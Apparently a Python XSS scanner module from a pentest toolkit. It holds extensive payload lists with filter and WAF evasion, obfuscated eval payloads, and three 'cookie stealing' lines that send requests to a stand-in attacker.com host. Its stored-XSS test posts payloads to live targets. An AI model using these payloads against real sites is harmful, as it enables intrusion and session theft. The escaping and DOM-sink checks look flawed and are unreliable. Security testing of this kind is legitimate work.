"""
modules/xss_detector.py - Cross-Site Scripting Detection and Exploitation
Reflected, Stored, DOM XSS
"""

import json
import logging
from typing import Dict, List, Any, Optional, Callable
from urllib.parse import urljoin, quote
import re

from core.http_engine import HTTPClient

logger = logging.getLogger("recon.xss")


class XSSDetector:
    """XSS detection - reflected, stored, DOM"""
    
    def __init__(self, output_dir: str, timeout: int = 30):
        self.output_dir = output_dir
        self.timeout = timeout
        self.http_client = HTTPClient(timeout=timeout)
        self.findings_file = f"{output_dir}/xss_findings.json"
    
    def detect(
        self,
        url: str,
        parameters: Optional[List[str]] = None,
        progress_cb: Optional[Callable[[str, str, str], None]] = None
    ) -> Dict[str, Any]:
        """Detect XSS vulnerabilities"""
        result = {
            'url': url,
            'tool': 'xss_detector',
            'type': 'xss_vulns',
            'reflected_xss': [],
            'stored_xss': [],
            'dom_xss': [],
            'payloads_tested': 0
        }
        
        if progress_cb:
            progress_cb('xss', 'xss_detector', 'Testing XSS...')
        
        logger.info(f"[XSS] Scanning {url}")
        
        if not parameters:
            parameters = self._extract_parameters(url)
        
        if not parameters:
            logger.info(f"[XSS] No parameters found")
            return result
        
        # Test reflected XSS
        for param in parameters:
            if progress_cb:
                progress_cb('xss', 'xss_detector', f'Testing {param}...')
            
            reflected = self._test_reflected(url, param)
            result['reflected_xss'].extend(reflected)
            result['payloads_tested'] += len(reflected)
            
            # Test stored XSS (via POST)
            stored = self._test_stored(url, param)
            result['stored_xss'].extend(stored)
        
        # Test DOM XSS
        dom = self._test_dom(url)
        result['dom_xss'].extend(dom)
        
        try:
            with open(self.findings_file, 'w') as f:
                json.dump(result, f, indent=2)
        except Exception as e:
            logger.error(f"[XSS] Error saving: {e}")
        
        if progress_cb:
            total = len(result['reflected_xss']) + len(result['stored_xss']) + len(result['dom_xss'])
            progress_cb('xss', 'xss_detector', f'Found {total} XSS vulns')
        
        return result
    
    def _test_reflected(self, url: str, param: str) -> List[Dict]:
        """Test for reflected XSS with modern payloads"""
        vulns = []
        
        # Modern XSS payloads - advanced evasion techniques
        payloads = [
            # === BASIC PAYLOADS (for initial detection) ===
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.cookie)>',
            '<svg onload=alert(window.origin)>',
            
            # === CONTEXT BREAKING PAYLOADS ===
            # Break out of HTML attributes
            '" autofocus onfocus=alert(document.domain)//',
            "' autofocus onfocus=alert(document.domain)//",
            '">><marquee onstart=alert(document.domain)>',
            
            # Break out of JavaScript context
            '</script><script>alert(document.domain)</script>',
            "'-alert(document.domain)-'",
            "';alert(String.fromCharCode(88,83,83))//",
            
            # === WAF BYPASS TECHNIQUES ===
            # Case variation
            '<ScRiPt>alert(document.domain)</sCrIpT>',
            '<IMG SRC=x ONERROR=alert(document.domain)>',
            '<SVG ONLOAD=alert(document.domain)>',
            
            # Encoding bypass
            '<script\\x20type="text/javascript">alert(document.domain)</script>',
            '<script\\x0D>alert(document.domain)</script>',
            '<script\\x0A>alert(document.domain)</script>',
            
            # Unicode bypass
            '<\\x73\\x63\\x72\\x69\\x70\\x74>alert(document.domain)</\\x73\\x63\\x72\\x69\\x70\\x74>',
            '\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e',
            
            # Null byte bypass
            '<script\\x00>alert(document.domain)</script>',
            '<img src=x onerror\\x00=alert(document.domain)>',
            
            # === DOUBLE ENCODING ===
            '%253Cscript%253Ealert(document.domain)%253C/script%253E',
            '%253cscript%253ealert(document.domain)%253c/script%253e',
            
            # === POLYGLOT PAYLOADS (work in multiple contexts) ===
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert(document.domain))//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e",
            
            # === DOM-BASED PAYLOADS ===
            '<img src=x onerror=this.innerHTML=\'<script>alert(document.domain)</script>\'>',
            '<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>',
            
            # === MUTATION-BASED XSS ===
            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>',
            '<noscript><img src=x onerror=alert(document.domain)>',
            
            # === TEMPLATE INJECTION PAYLOADS ===
            '{{constructor.constructor("alert(document.domain)")()}}',
            '${alert(document.domain)}',
            '<%=alert(document.domain)%>',
            
            # === ADVANCED EVENT HANDLERS ===
            '<details open ontoggle=alert(document.domain)>',
            '<xss onafterscriptexecute=alert(document.domain)><script>1</script>',
            '<xss onbeforescriptexecute=alert(document.domain)><script>1</script>',
            '<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>',
            
            # === COOKIE STEALING SIMULATION ===
            '<img src="http://attacker.com/?c=cookie_test">',
            '<script>fetch("http://attacker.com/?c=test")</script>',
            '<script>new Image().src="http://attacker.com/?c=test";</script>',
            
            # === REFLECTED XSS WITH FILTERS ===
            # Bypass word filters
            '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
            '<<script>script>alert(document.domain)<</script>/script>',
            
            # Bypass tag filters
            '<img src=x onerror=eval(atob("ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT4n"))>',
        ]
        
        for payload in payloads:
            try:
                test_url = self._inject_parameter(url, param, payload)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                
                # Check if payload in response unescaped
                if self._is_payload_unescaped(payload, resp.text):
                    vulns.append({
                        'parameter': param,
                        'type': 'reflected',
                        'payload': payload,
                        'confidence': 'high'
                    })
                    logger.info(f"[XSS] REFLECTED FOUND on {param}")
                    break
            
            except Exception as e:
                logger.debug(f"[XSS] Test failed: {e}")
        
        return vulns
    
    def _test_stored(self, url: str, param: str) -> List[Dict]:
        """Test for stored XSS with modern payloads"""
        vulns = []
        
        # Modern stored XSS payloads
        payloads = [
            # Basic payloads
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.cookie)>',
            
            # Advanced payloads
            '<svg onload=alert(document.domain)>',
            '<body onload=alert(document.domain)>',
            
            # WAF bypass
            '<ScRiPt>alert(document.domain)</sCrIpT>',
            '<IMG SRC=x ONERROR=alert(document.domain)>',
            
            # Mutation-based
            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>',
            '<noscript><img src=x onerror=alert(document.domain)>',
        ]
        
        for payload in payloads:
            try:
                data = {param: payload}
                resp = self.http_client.post(url, data=data, timeout=self.timeout)
                
                # If successful, verify persistence
                verify = self.http_client.get(url, timeout=self.timeout)
                if self._is_payload_unescaped(payload, verify.text):
                    vulns.append({
                        'parameter': param,
                        'type': 'stored',
                        'payload': payload,
                        'confidence': 'high'
                    })
                    logger.info(f"[XSS] STORED FOUND on {param}")
                    break
            
            except Exception as e:
                logger.debug(f"[XSS] Stored test failed: {e}")
        
        return vulns
    
    def _test_dom(self, url: str) -> List[Dict]:
        """Test for DOM-based XSS with modern payloads"""
        vulns = []
        
        # Modern DOM XSS payloads
        dom_payloads = [
            # Basic fragment injection
            '#<img src=x onerror=alert(document.domain)>',
            '#<svg onload=alert(document.domain)>',
            
            # Hash-based payloads
            '#<script>alert(document.domain)</script>',
            '#javascript:alert(document.domain)',
            
            # DOM sink payloads
            '#<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>',
            '#<img src=x onerror=this.innerHTML=\'<script>alert(document.domain)</script>\'>',
            
            # Advanced DOM payloads
            '#<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>',
            '#<details open ontoggle=alert(document.domain)>',
            
            # Template injection
            '#{{constructor.constructor("alert(document.domain)")()}}',
            '#${alert(document.domain)}',
        ]
        
        for payload in dom_payloads:
            try:
                test_url = f"{url}{payload}"
                resp = self.http_client.get(test_url, timeout=self.timeout)
                
                # Check for DOM manipulation sinks
                dom_sinks = [
                    'eval(',
                    'innerHTML',
                    'document.write',
                    'outerHTML',
                    'insertAdjacentHTML',
                    'dangerouslySetInnerHTML',
                    '$(\'',
                    '.html(',
                    'document.createElement',
                    'appendChild',
                ]
                
                found_sinks = [sink for sink in dom_sinks if sink in resp.text]
                if found_sinks:
                    vulns.append({
                        'type': 'dom',
                        'payload': payload,
                        'indicator': f'DOM sinks found: {", ".join(found_sinks)}',
                        'confidence': 'medium'
                    })
                    logger.info(f"[XSS] DOM XSS potential found with sinks: {found_sinks}")
                    break
                
                # Also check if payload is reflected in JavaScript context
                if payload.lstrip('#') in resp.text:
                    vulns.append({
                        'type': 'dom',
                        'payload': payload,
                        'indicator': 'Payload reflected in response',
                        'confidence': 'low'
                    })
                    logger.info(f"[XSS] DOM XSS potential - payload reflected")
                    break
        
            except Exception as e:
                logger.debug(f"[XSS] DOM test failed: {e}")
        
        return vulns
    
    def _is_payload_unescaped(self, payload: str, response: str) -> bool:
        """Check if payload appears unescaped in response"""
        # Check for various escape patterns
        escape_patterns = [
            'lt;',  # &lt;
            'amp;',  # &amp;
            'quot;',  # &quot;
            '&#',  # HTML entity
        ]
        
        # If payload is unescaped, it will appear as-is
        if payload in response:
            # But check it's not escaped
            for pattern in escape_patterns:
                escaped = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace('&', '&amp;')
                if escaped in response:
                    return False  # It's escaped
            
            return True  # Unescaped
        
        return False
    
    def _extract_parameters(self, url: str) -> List[str]:
        """Extract parameters from URL"""
        params = []
        if '?' not in url:
            return params
        
        query_string = url.split('?', 1)[1]
        for pair in query_string.split('&'):
            if '=' in pair:
                param, _ = pair.split('=', 1)
                params.append(param)
        
        return params
    
    def _inject_parameter(self, url: str, param: str, payload: str) -> str:
        """Inject payload into parameter"""
        if '?' not in url:
            return url + f"?{param}={quote(payload)}"
        
        if param in url:
            import re
            pattern = rf"{param}=[^&]*"
            return re.sub(pattern, f"{param}={quote(payload)}", url)
        else:
            return url + f"&{param}={quote(payload)}"
